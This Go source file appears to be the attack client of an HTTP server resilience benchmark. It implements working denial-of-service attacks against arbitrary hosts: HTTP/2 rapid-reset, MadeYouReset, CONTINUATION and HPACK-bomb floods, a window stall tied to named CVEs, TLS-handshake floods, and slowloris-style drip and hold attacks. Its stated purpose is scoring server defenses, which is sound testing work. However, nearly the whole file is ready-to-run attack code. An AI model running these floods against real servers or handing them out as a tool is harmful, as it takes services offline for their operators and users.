// httparena resilience attacker — a dependency-free (stdlib-only) raw-socket
// attack engine for the GIL-bound resilience attacks, where CPython's GIL caps
// the frame-construction floods (rapid-reset et al.) at ~1 core of real work no
// matter how many cores taskset grants. Goroutines give true parallelism, so a
// ~60-core client can actually outproduce a 2-thread server.
//
// It implements ONLY the speed-critical attacks (the H2 frame floods, the H1
// volume floods, and the TLS-handshake flood). Every other attack — the slow
// holds, the amplification/parser attacks, the WebSocket attacks and dheat
// (Go's crypto/tls offers no finite-field DHE) — stays in attack.py, which is
// not rate-bound and where the GIL is not the bottleneck.
//
// Output: ONE line of JSON on stdout, the same shape attack.py emits, so
// resilience_results.py scores either client without caring which ran.
//
//	established     — connections that completed connect + H2 preface / TCP
//	reaped          — established conns the SERVER then dropped mid-attack (a
//	                  defense: a timeout or a frame/stream cap fired)
//	connect_errors  — conns that never established (refused / handshake fail);
//	                  NOT a defense — kept separate so a down server can't read
//	                  as "reaped everything"
//	frames_sent / bytes_sent — offered volume
package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var h2Preface = []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")

type stats struct {
	Attack        string  `json:"attack"`
	ConnsReq      int     `json:"conns_requested"`
	Established   int64   `json:"established"`
	Reaped        int64   `json:"reaped"`
	OpenAtEnd     int64   `json:"open_at_end"`
	ConnectErrors int64   `json:"connect_errors"`
	FramesSent    int64   `json:"frames_sent,omitempty"`
	BytesSent     int64   `json:"bytes_sent,omitempty"`
	DripSentBytes int64   `json:"drip_sent_bytes,omitempty"` // slow/drip engines (scorer reads this, not bytes_sent)
	ElapsedS      float64 `json:"elapsed_s"`
	Client        string  `json:"client"`
}

type config struct {
	attack        string
	host          string
	port          int
	path          string
	conns         int
	duration      time.Duration
	useTLS        bool
	uploadSize    int64
	pipelineDepth int
	dripInterval  time.Duration
	dripBytes     int
	bodySize      int64
	clDeclare     int64
	chunkExtSize  int
	stallCount    int
	stallStreams  int
}

func (c *config) addr() string { return fmt.Sprintf("%s:%d", c.host, c.port) }

// ── HTTP/2 framing (hand-rolled; no x/net dependency) ──────────────────────

// frame builds one HTTP/2 frame: 24-bit length, type, flags, 31-bit stream id.
func frame(ftype, flags byte, stream uint32, payload []byte) []byte {
	n := len(payload)
	buf := make([]byte, 9+n)
	buf[0], buf[1], buf[2] = byte(n>>16), byte(n>>8), byte(n)
	buf[3], buf[4] = ftype, flags
	binary.BigEndian.PutUint32(buf[5:9], stream&0x7fffffff)
	copy(buf[9:], payload)
	return buf
}

// hpackInt encodes an HPACK integer with the given prefix width.
func hpackInt(value, prefixBits int) []byte {
	mask := (1 << prefixBits) - 1
	if value < mask {
		return []byte{byte(value)}
	}
	out := []byte{byte(mask)}
	value -= mask
	for value >= 128 {
		out = append(out, byte(value&0x7f)|0x80)
		value >>= 7
	}
	return append(out, byte(value))
}

// hpackStr encodes a raw (un-Huffman'd) HPACK string literal.
func hpackStr(data []byte) []byte { return append(hpackInt(len(data), 7), data...) }

// h2GetBlock: a minimal valid HEADERS block for GET <path> on :authority.
// :method GET (0x82), :scheme http (0x86), :path / (0x84) are static-table
// indices; :authority is a literal-without-indexing (0x01 + name idx 1).
func h2GetBlock(authority string) []byte {
	return append([]byte{0x82, 0x86, 0x84, 0x01}, hpackStr([]byte(authority))...)
}

// h2GetBlockPath: like h2GetBlock but with a literal (non-"/") path. :method GET
// (0x82), :scheme http (0x86), :path literal with indexed name 4 (0x04) + value,
// :authority literal with indexed name 1 (0x01) + value.
func h2GetBlockPath(authority, path string) []byte {
	out := []byte{0x82, 0x86, 0x04}
	out = append(out, hpackStr([]byte(path))...)
	out = append(out, 0x01)
	return append(out, hpackStr([]byte(authority))...)
}

// hpackFiller returns exactly `size` bytes of never-indexed literal headers,
// used to pad CONTINUATION frames (continuation-flood).
func hpackFiller(size int) []byte {
	out := make([]byte, 0, size+64)
	for k := 0; len(out) < size; k++ {
		name := []byte(fmt.Sprintf("x-pad-%x", k))
		val := make([]byte, 32)
		for i := range val {
			val[i] = 'a'
		}
		out = append(out, 0x00) // literal, never indexed, new name
		out = append(out, hpackStr(name)...)
		out = append(out, hpackStr(val)...)
	}
	return out[:size] // never overshoot SETTINGS_MAX_FRAME_SIZE
}

// dial opens a raw TCP (optionally TLS, with the given ALPN) connection.
func dial(c *config, alpn string) (net.Conn, error) {
	d := &net.Dialer{Timeout: 5 * time.Second}
	if c.useTLS {
		return tls.DialWithDialer(d, "tcp", c.addr(), &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{alpn},
		})
	}
	return d.Dial("tcp", c.addr())
}

// counter batches a goroutine's frame/byte tallies and flushes them to the
// shared atomics every flushEvery frames. That keeps the hot path off a
// per-frame atomic add (which would cache-line-bounce across ~60 goroutines and
// gut throughput) while still letting a mid-run signal reader see near-live
// totals — the remainder (<flushEvery) is flushed on done().
const (
	flushEvery = 4096            // frames
	flushBytes = int64(64) << 20 // or 64 MiB, whichever comes first
)

type counter struct {
	st         *stats
	drip       bool // route bytes to DripSentBytes (slow/drip engines) instead of BytesSent
	accF, accB int64
}

// tally records `frames` frames and `bytes` bytes, flushing to the shared
// atomics once either batch threshold is crossed. Volume attacks pass (0,n) per
// chunk and (1,0) per completed request; the frame floods pass (1,len).
func (ct *counter) tally(frames, bytes int64) {
	ct.accF += frames
	ct.accB += bytes
	if ct.accF >= flushEvery || ct.accB >= flushBytes {
		ct.flush()
	}
}

func (ct *counter) flush() {
	if ct.accF != 0 || ct.accB != 0 {
		atomic.AddInt64(&ct.st.FramesSent, ct.accF)
		if ct.drip {
			atomic.AddInt64(&ct.st.DripSentBytes, ct.accB)
		} else {
			atomic.AddInt64(&ct.st.BytesSent, ct.accB)
		}
		ct.accF, ct.accB = 0, 0
	}
}

func (ct *counter) done() { ct.flush() }

// ── generic per-connection fan-out ─────────────────────────────────────────

// fanout runs `body` on `conns` goroutines, each on its own connection. body
// gets a live conn and the shared deadline and returns `reaped` — whether the
// SERVER dropped this established connection (a defense). body tallies its own
// frames/bytes through a counter (so a mid-run signal sees near-live totals);
// fanout owns only established/reaped. Connect/preface failures are counted as
// connect_errors and body is not called.
func fanout(c *config, st *stats, alpn string, preface func(net.Conn) error,
	body func(conn net.Conn, deadline time.Time) bool) {
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := dial(c, alpn)
			if err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			if preface != nil {
				if err := preface(conn); err != nil {
					atomic.AddInt64(&st.ConnectErrors, 1)
					return
				}
			}
			atomic.AddInt64(&st.Established, 1)
			if body(conn, deadline) {
				atomic.AddInt64(&st.Reaped, 1)
			}
		}()
	}
	wg.Wait()
}

// writeTO bounds every H2 write. We never read the H2 socket, so a server that
// backpressures (bounded ACK/output buffers — i.e. a well-defended one) stops
// reading and our Write would block forever; the loop deadline is only checked
// *between* writes, so without this a single blocked Write hangs the goroutine
// and fanout's Wait() — stalling the whole suite. A write timeout is treated as
// reaped (matches attack.py, whose inherited 5s socket timeout does the same).
const writeTO = 5 * time.Second

// h2Preamble writes the connection preface + an empty SETTINGS frame.
func h2Preamble(conn net.Conn) error {
	conn.SetWriteDeadline(time.Now().Add(writeTO))
	if _, err := conn.Write(h2Preface); err != nil {
		return err
	}
	conn.SetWriteDeadline(time.Now().Add(writeTO))
	_, err := conn.Write(frame(0x4, 0, 0, nil))
	return err
}

// writeLoop re-sends `payload` until the deadline or the server drops us.
// Used by the floods whose per-iteration frame is constant. Returns reaped.
func writeLoop(conn net.Conn, deadline time.Time, st *stats, lead []byte, payload []byte) bool {
	ct := counter{st: st}
	defer ct.done()
	if lead != nil {
		conn.SetWriteDeadline(time.Now().Add(writeTO))
		if _, err := conn.Write(lead); err != nil {
			return true
		}
		ct.tally(1, int64(len(lead)))
	}
	for time.Now().Before(deadline) {
		conn.SetWriteDeadline(time.Now().Add(writeTO))
		if _, err := conn.Write(payload); err != nil {
			return true
		}
		ct.tally(1, int64(len(payload)))
	}
	return false
}

// ── HTTP/2 attacks ─────────────────────────────────────────────────────────

func continuationFlood(c *config, st *stats) {
	lead := frame(0x1, 0x1, 1, h2GetBlock(c.host)) // HEADERS, END_STREAM, no END_HEADERS
	cont := frame(0x9, 0x0, 1, hpackFiller(16384)) // CONTINUATION, never END_HEADERS
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, lead, cont)
	})
}

func hpackBomb(c *config, st *stats) {
	// One oversized dynamic-table entry, then a flood of 1-byte references
	// (0xBE = indexed header field, dynamic index 62) that each re-expand it.
	bigVal := make([]byte, 3900)
	for i := range bigVal {
		bigVal[i] = 'a'
	}
	initial := append([]byte{0x82, 0x86, 0x84, 0x01}, hpackStr([]byte(c.host))...)
	initial = append(initial, 0x40)                       // literal WITH incremental indexing, new name
	initial = append(initial, hpackStr([]byte("x-b"))...) // name
	initial = append(initial, hpackStr(bigVal)...)        // 3900-byte value → into dynamic table
	refs := make([]byte, 16384)
	for i := range refs {
		refs[i] = 0xBE
	}
	lead := frame(0x1, 0x1, 1, initial)
	cont := frame(0x9, 0x0, 1, refs)
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, lead, cont)
	})
}

func rapidReset(c *config, st *stats) {
	hdr := h2GetBlock(c.host)
	rst := []byte{0, 0, 0, 8} // RST_STREAM, error code CANCEL (0x8)
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		var sid uint32 = 1
		for time.Now().Before(dl) && sid < 0x7fffffff {
			msg := append(frame(0x1, 0x5, sid, hdr), frame(0x3, 0x0, sid, rst)...)
			conn.SetWriteDeadline(time.Now().Add(writeTO))
			if _, err := conn.Write(msg); err != nil {
				return true
			}
			ct.tally(1, int64(len(msg)))
			sid += 2
		}
		return false
	})
}

func madeYouReset(c *config, st *stats) {
	// Open a stream, then provoke the SERVER into sending RST_STREAM by sending
	// a protocol error on it (WINDOW_UPDATE with a 0 increment) — the server
	// does the per-stream reset work, sidestepping client-side rapid-reset caps.
	hdr := h2GetBlock(c.host)
	badWU := []byte{0, 0, 0, 0} // WINDOW_UPDATE increment 0 → PROTOCOL_ERROR
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		var sid uint32 = 1
		for time.Now().Before(dl) && sid < 0x7fffffff {
			msg := append(frame(0x1, 0x5, sid, hdr), frame(0x8, 0x0, sid, badWU)...)
			conn.SetWriteDeadline(time.Now().Add(writeTO))
			if _, err := conn.Write(msg); err != nil {
				return true
			}
			ct.tally(1, int64(len(msg)))
			sid += 2
		}
		return false
	})
}

func settingsFlood(c *config, st *stats) {
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, nil, frame(0x4, 0x0, 0, nil)) // empty SETTINGS → forces ACK
	})
}

func pingFlood(c *config, st *stats) {
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, nil, frame(0x6, 0x0, 0, make([]byte, 8))) // PING → forces ACK
	})
}

func emptyFrameFlood(c *config, st *stats) {
	lead := frame(0x1, 0x4, 1, h2GetBlock(c.host)) // HEADERS, END_HEADERS, keep stream open
	empty := frame(0x0, 0x0, 1, nil)               // 0-length DATA, no END_STREAM
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		return writeLoop(conn, dl, st, lead, empty)
	})
}

// ── HTTP/1.1 volume attacks ────────────────────────────────────────────────

func largeUpload(c *config, st *stats) {
	headers := []byte(fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n",
		c.path, c.host, c.uploadSize))
	chunk := make([]byte, 1<<20) // 1 MiB write buffer
	for i := range chunk {
		chunk[i] = 'A'
	}
	alpn := "http/1.1"
	fanout(c, st, alpn, nil, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		rbuf := make([]byte, 4096)
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write(headers); err != nil {
				if !isTimeout(err) {
					return true // reset = reaped
				}
				continue // write timeout = backpressure, connection alive — retry
			}
			remaining := c.uploadSize
			stalled := false
			for remaining > 0 && time.Now().Before(dl) {
				n := int64(len(chunk))
				if n > remaining {
					n = remaining
				}
				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
				if _, err := conn.Write(chunk[:n]); err != nil {
					if !isTimeout(err) {
						return true // server capped the body and dropped us = reaped
					}
					stalled = true // backpressure — abandon this body, retry (not reaped)
					break
				}
				ct.tally(0, n) // bytes, no completed request yet
				remaining -= n
			}
			if stalled {
				continue
			}
			ct.tally(1, 0) // one upload completed
			conn.SetReadDeadline(time.Now().Add(1 * time.Second))
			if _, err := conn.Read(rbuf); err != nil {
				// a reset/close after the body is also the server shedding us
				if ne, ok := err.(net.Error); !ok || !ne.Timeout() {
					return true
				}
			}
		}
		return false
	})
}

func pipeliningFlood(c *config, st *stats) {
	one := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", c.path, c.host))
	batch := make([]byte, 0, len(one)*c.pipelineDepth)
	for i := 0; i < c.pipelineDepth; i++ {
		batch = append(batch, one...)
	}
	alpn := "http/1.1"
	fanout(c, st, alpn, nil, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		for time.Now().Before(dl) {
			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write(batch); err != nil {
				return !isTimeout(err) // reset = reaped; write timeout = backpressure, stop but alive
			}
			ct.tally(int64(c.pipelineDepth), int64(len(batch)))
		}
		return false
	})
}

// ── TLS handshake flood ────────────────────────────────────────────────────

func tlsHandshakeFlood(c *config, st *stats) {
	// Each worker opens full TLS handshakes back-to-back and drops them — the
	// cost is the server's asymmetric key-exchange per handshake, not bytes.
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			var hs int64
			established := false
			for time.Now().Before(deadline) {
				conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 5 * time.Second},
					"tcp", c.addr(), &tls.Config{InsecureSkipVerify: true})
				if err != nil {
					if !established {
						atomic.AddInt64(&st.ConnectErrors, 1)
					}
					break // not return: a mid-loop dial failure (port exhaustion /
					// the server starting to refuse — i.e. the attack working) must
					// still record this worker's established + handshake count below.
				}
				established = true
				hs++
				conn.Close()
			}
			if established {
				atomic.AddInt64(&st.Established, 1)
			}
			atomic.AddInt64(&st.FramesSent, hs) // handshakes completed
		}()
	}
	wg.Wait()
}

// ── HTTP/1.1 slow / hold attacks (connection count is the lever) ────────────
//
// Ports of attack.py's _run_slow (drip) and _h1_hold (drain) engines. A goroutine
// per connection scales to tens of thousands of held connections, where CPython's
// thread-per-connection model tops out near a few thousand. established/reaped are
// tracked atomically (so an early-exit signal flush sees them live); the flush
// computes open_at_end = established - reaped.

func sleepUntil(deadline time.Time, d time.Duration) {
	rem := time.Until(deadline)
	if rem <= 0 {
		return
	}
	if d > rem {
		d = rem
	}
	time.Sleep(d)
}

// isTimeout reports whether err is a deadline timeout — buffer full or no data yet,
// connection still alive — as opposed to a real close (EOF / reset = reaped).
func isTimeout(err error) bool {
	ne, ok := err.(net.Error)
	return ok && ne.Timeout()
}

func h1ALPN(c *config) string {
	if c.useTLS {
		return "http/1.1"
	}
	return ""
}

// runSlow opens N connections, sends opener(i) on each, then drips dripper(i,d)
// every dripInterval until the deadline. A write failing for any reason other than
// a timeout means the server closed us (reaped); a timeout means its read buffer is
// full but the connection is alive, so we keep holding (attack.py's BlockingIOError
// skip).
func runSlow(c *config, st *stats, opener func(i int) []byte, dripper func(i, d int) []byte) {
	alpn := h1ALPN(c)
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			conn, err := dial(c, alpn)
			if err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if _, err := conn.Write(opener(idx)); err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			atomic.AddInt64(&st.Established, 1)
			ct := counter{st: st, drip: true}
			defer ct.done()
			for d := 0; time.Now().Before(deadline); d++ {
				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
				n, err := conn.Write(dripper(idx, d))
				if n > 0 {
					ct.tally(0, int64(n))
				}
				if err != nil && !isTimeout(err) {
					atomic.AddInt64(&st.Reaped, 1)
					return
				}
				sleepUntil(deadline, c.dripInterval)
			}
		}(i)
	}
	wg.Wait()
}

// runHold opens N connections, sends one complete-but-waiting request on each, then
// holds them idle — draining with a read deadline to notice when the server reaps
// the connection (its idle/request timeout fires). EOF or reset = reaped; a read
// timeout means no data yet but the connection is alive, so we keep holding.
func runHold(c *config, st *stats, opener []byte) {
	alpn := h1ALPN(c)
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := dial(c, alpn)
			if err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if _, err := conn.Write(opener); err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			atomic.AddInt64(&st.Established, 1)
			buf := make([]byte, 4096)
			for time.Now().Before(deadline) {
				conn.SetReadDeadline(time.Now().Add(1 * time.Second))
				if _, err := conn.Read(buf); err != nil && !isTimeout(err) {
					atomic.AddInt64(&st.Reaped, 1) // EOF / reset → server closed us
					return
				}
				sleepUntil(deadline, time.Second)
			}
		}()
	}
	wg.Wait()
}

func slowBody(c *config, st *stats) {
	opener := func(i int) []byte {
		return []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nContent-Type: application/octet-stream\r\n\r\n",
			c.path, c.host, c.bodySize))
	}
	pad := bytes.Repeat([]byte("A"), c.dripBytes)
	runSlow(c, st, opener, func(i, d int) []byte { return pad })
}

func slowHeaders(c *config, st *stats) {
	opener := func(i int) []byte {
		return []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n", c.path, c.host))
	}
	filler := strings.Repeat("A", 48)
	runSlow(c, st, opener, func(i, d int) []byte {
		return []byte(fmt.Sprintf("X-Pad-%d-%d: %s\r\n", i, d, filler))
	})
}

func hugeChunk(c *config, st *stats) {
	opener := func(i int) []byte {
		return []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n7fffffffffffffff\r\n",
			c.path, c.host))
	}
	pad := bytes.Repeat([]byte("A"), c.dripBytes)
	runSlow(c, st, opener, func(i, d int) []byte { return pad })
}

func trailerFlood(c *config, st *stats) {
	opener := func(i int) []byte {
		return []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n",
			c.path, c.host))
	}
	runSlow(c, st, opener, func(i, d int) []byte {
		return []byte(fmt.Sprintf("X-Trailer-%d-%d: a\r\n", i, d))
	})
}

func chunkExtensionFlood(c *config, st *stats) {
	ext := strings.Repeat("a", c.chunkExtSize)
	opener := func(i int) []byte {
		return []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n", c.path, c.host))
	}
	drip := []byte(fmt.Sprintf("1;%s\r\nA\r\n", ext))
	runSlow(c, st, opener, func(i, d int) []byte { return drip })
}

func keepaliveHoard(c *config, st *stats) {
	runHold(c, st, []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", c.path, c.host)))
}

func contentLengthPrealloc(c *config, st *stats) {
	runHold(c, st, []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n",
		c.path, c.host, c.clDeclare)))
}

func expect100Continue(c *config, st *stats) {
	runHold(c, st, []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\nExpect: 100-continue\r\n\r\n",
		c.path, c.host, c.clDeclare)))
}

func chunkSizeOverflow(c *config, st *stats) {
	runHold(c, st, []byte(fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\nfffffffffffffffe\r\n",
		c.path, c.host)))
}

// slowRead requests a large static response and reads it ~1 byte per interval, so
// the server's send buffer stays full and it buffers (or blocks on) the response it
// cannot flush. Target is fixed to a ~300 KiB asset (well past the send buffer).
func slowRead(c *config, st *stats) {
	alpn := h1ALPN(c)
	req := []byte(fmt.Sprintf("GET /static/vendor.js HTTP/1.1\r\nHost: %s\r\n\r\n", c.host))
	deadline := time.Now().Add(c.duration)
	var wg sync.WaitGroup
	for i := 0; i < c.conns; i++ {
		if time.Now().After(deadline) {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := dial(c, alpn)
			if err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			defer conn.Close()
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if _, err := conn.Write(req); err != nil {
				atomic.AddInt64(&st.ConnectErrors, 1)
				return
			}
			atomic.AddInt64(&st.Established, 1)
			ct := counter{st: st, drip: true}
			defer ct.done()
			one := make([]byte, 1)
			for time.Now().Before(deadline) {
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, err := conn.Read(one)
				if n > 0 {
					ct.tally(0, int64(n))
				}
				if err != nil && !isTimeout(err) {
					atomic.AddInt64(&st.Reaped, 1)
					return
				}
				sleepUntil(deadline, c.dripInterval)
			}
		}()
	}
	wg.Wait()
}

// windowStall advertises INITIAL_WINDOW_SIZE=0, opens many streams each asking for a
// large response, and never grants window — so the server generates and buffers
// responses it can never flush (CVE-2019-9517 / CVE-2023-43622).
func windowStall(c *config, st *stats) {
	settings0 := frame(0x4, 0, 0, []byte{0x00, 0x04, 0x00, 0x00, 0x00, 0x00}) // INITIAL_WINDOW_SIZE=0
	block := h2GetBlockPath(c.host, fmt.Sprintf("/json/%d", c.stallCount))
	fanout(c, st, "h2", h2Preamble, func(conn net.Conn, dl time.Time) bool {
		ct := counter{st: st}
		defer ct.done()
		conn.SetWriteDeadline(time.Now().Add(writeTO))
		if _, err := conn.Write(settings0); err != nil {
			return true
		}
		ct.tally(1, int64(len(settings0)))
		var sid uint32 = 1
		for i := 0; i < c.stallStreams; i++ {
			hf := frame(0x1, 0x5, sid, block)
			conn.SetWriteDeadline(time.Now().Add(writeTO))
			if _, err := conn.Write(hf); err != nil {
				return true
			}
			ct.tally(1, int64(len(hf)))
			sid += 2
		}
		for time.Now().Before(dl) { // hold streams open, never granting window
			sleepUntil(dl, 500*time.Millisecond)
		}
		return false
	})
}

// ── entry point ────────────────────────────────────────────────────────────

// goAttacks is the set this client owns; resilience.sh dispatches exactly these
// here and everything else to attack.py. Keep in sync with the switch below.
var goAttacks = map[string]func(*config, *stats){
	// HTTP/2 frame floods
	"continuation-flood": continuationFlood,
	"hpack-bomb":         hpackBomb,
	"rapid-reset":        rapidReset,
	"madeyoureset":       madeYouReset,
	"settings-flood":     settingsFlood,
	"ping-flood":         pingFlood,
	"empty-frame-flood":  emptyFrameFlood,
	"window-stall":       windowStall,
	// HTTP/1.1 volume / TLS
	"large-upload":        largeUpload,
	"pipelining-flood":    pipeliningFlood,
	"tls-handshake-flood": tlsHandshakeFlood,
	// HTTP/1.1 slow drip (connection-count lever)
	"slow-body":             slowBody,
	"slow-headers":          slowHeaders,
	"slow-read":             slowRead,
	"huge-chunk":            hugeChunk,
	"trailer-flood":         trailerFlood,
	"chunk-extension-flood": chunkExtensionFlood,
	// HTTP/1.1 hold (complete-but-waiting / reserve resources)
	"keepalive-hoard":         keepaliveHoard,
	"content-length-prealloc": contentLengthPrealloc,
	"expect-100-continue":     expect100Continue,
	"chunk-size-overflow":     chunkSizeOverflow,
}

func main() {
	c := &config{}
	flag.StringVar(&c.attack, "attack", "", "attack name")
	flag.StringVar(&c.host, "host", "127.0.0.1", "target host (also HTTP/2 :authority)")
	flag.IntVar(&c.port, "port", 0, "target port")
	flag.StringVar(&c.path, "path", "/", "request path")
	flag.IntVar(&c.conns, "conns", 256, "concurrent connections")
	var durSec float64
	flag.Float64Var(&durSec, "duration", 25, "seconds")
	flag.BoolVar(&c.useTLS, "tls", false, "wrap the socket in TLS")
	flag.Int64Var(&c.uploadSize, "upload-size", 2147483648, "large-upload body bytes")
	flag.IntVar(&c.pipelineDepth, "pipeline-depth", 10000, "pipelining-flood batch depth")
	var dripSec float64
	flag.Float64Var(&dripSec, "drip-interval", 1.0, "seconds between drips (slow attacks)")
	flag.IntVar(&c.dripBytes, "drip-bytes", 1, "bytes per drip (slow-body/huge-chunk)")
	flag.Int64Var(&c.bodySize, "body-size", 10*1024*1024, "slow-body declared Content-Length")
	flag.Int64Var(&c.clDeclare, "cl-declare", 2*1024*1024*1024, "declared Content-Length (prealloc/expect holds)")
	flag.IntVar(&c.chunkExtSize, "chunk-ext-size", 4096, "chunk-extension bytes per chunk")
	flag.IntVar(&c.stallCount, "stall-count", 5000, "window-stall response size (/json/N)")
	flag.IntVar(&c.stallStreams, "stall-streams", 64, "window-stall streams per connection")

	// attack.py-shared flags this client does not use, declared so a shared
	// invocation (resilience.sh passes the full set) parses cleanly.
	for _, name := range []string{
		"bomb-size", "hashdos-keys", "json-depth", "multipart-parts", "redos-pad",
		"chunk-count", "header-value-size", "header-count", "dup-headers",
		"qvalue-count", "cookie-pairs", "percent-count", "range-count",
		"bignum-digits", "ws-frame-len", "ws-frag-size",
	} {
		var ignored string
		flag.StringVar(&ignored, name, "", "(ignored by the Go client)")
	}
	flag.Parse()
	c.duration = time.Duration(durSec * float64(time.Second))
	c.dripInterval = time.Duration(dripSec * float64(time.Second))

	run, ok := goAttacks[c.attack]
	if !ok {
		fmt.Fprintf(os.Stderr, "resilience-attacker: attack %q is not handled by the Go client\n", c.attack)
		os.Exit(2)
	}

	st := &stats{Attack: c.attack, ConnsReq: c.conns, Client: "go"}
	start := time.Now()

	// Emit the stats line exactly once — whether the attack runs to completion
	// or resilience.sh kills us early (the server died; its early-exit sends
	// SIGTERM). On an early kill we still report what we offered up to that
	// point, so a crash verdict keeps its established/reaped/bytes context.
	var once sync.Once
	flush := func() {
		once.Do(func() {
			snap := stats{
				Attack: st.Attack, ConnsReq: st.ConnsReq, Client: st.Client,
				Established:   atomic.LoadInt64(&st.Established),
				Reaped:        atomic.LoadInt64(&st.Reaped),
				ConnectErrors: atomic.LoadInt64(&st.ConnectErrors),
				FramesSent:    atomic.LoadInt64(&st.FramesSent),
				BytesSent:     atomic.LoadInt64(&st.BytesSent),
				DripSentBytes: atomic.LoadInt64(&st.DripSentBytes),
				ElapsedS:      time.Since(start).Seconds(),
			}
			// Connections still held when the attack ended (not reaped) — the
			// scorer surfaces this next to reaped/established in the PR comment.
			snap.OpenAtEnd = snap.Established - snap.Reaped
			json.NewEncoder(os.Stdout).Encode(&snap)
		})
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGTERM, syscall.SIGINT)
	go func() { <-sig; flush(); os.Exit(0) }()

	run(c, st)
	flush()
}
